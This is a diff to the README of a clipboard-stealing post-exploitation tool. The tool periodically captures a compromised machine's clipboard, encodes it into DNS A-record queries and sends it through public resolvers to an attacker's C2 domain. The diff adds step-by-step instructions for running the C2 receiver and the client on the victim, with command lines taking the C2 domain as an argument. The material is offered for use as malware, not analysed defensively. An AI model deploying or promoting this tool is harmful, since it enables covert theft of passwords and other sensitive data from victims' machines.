@@ -2,7 +2,7 @@
 
 Clipboard can contain everything from passwords to possible critical data. 
 This tool is quite simple, light, and it does only one thing (so far) that is stealing whatever a compromised machine has on clipboard. it can be used post exploitation for Windows,macOS, or Linux machines
-It periodically captures the contents of the clipboard, encodes the data into a DNS payload, and sends it as a DNS query -type A- to your C2 server. 
+It periodically captures the contents of the clipboard, encodes the data into a DNS payload, and sends hidden in a DNS query -type A- to your C2 server. 
 
 ## Prerequisites
 
@@ -22,9 +22,10 @@ The code pastes whatever is in the clipboard, encodes it, splits it into small c
 
 ![img_1.png](img_1.png)
 
-Now this query will be sent to any DNS server (I am using `8.8.8.8` in client.py) which in turn will send request to your c2 domain `shahin.com` 
+Now this query will be sent through any public DNS server (I am using `8.8.8.8` in client.py) which in turn will send request to your c2 DNS server `shahin.com` 
 
 - On your C2, query will be split and qname (payload) will be decoded and re-assembled which will eventually save stolen clipboard data in a file 
+
 ![img_2.png](img_2.png)
 
 This happens every 15 minutes, it only sends data if the content is different from last time it was sent
@@ -34,13 +35,16 @@ This happens every 15 minutes, it only sends data if the content is different fr
 
 1. Install the required dependencies as mentioned in prerequisites
 
-2. Run the program by executing the `client.py` script:
+2. On your C2, run c2.py 
+Don't forget to set file_path (where you want data to be saved) 
+
+3. On compromised machine, run the program by executing the `client.py` script:
 `python clipboard_sender.py 'example.com'`
 
 Where: 
 - example.com: Your C2 domain address
 
-3. If you are using the .exe you can run it by running the following command:
+4. If you are using the .exe you can run it by running the following command:
 `clipboardhost.exe example.com`
 
 5. Now you're all set! it will continuously monitor the clipboard for changes and send the data in the clipboard to the C2 server every 15 minutes (Depending on the frequency the user updates his clipboard)
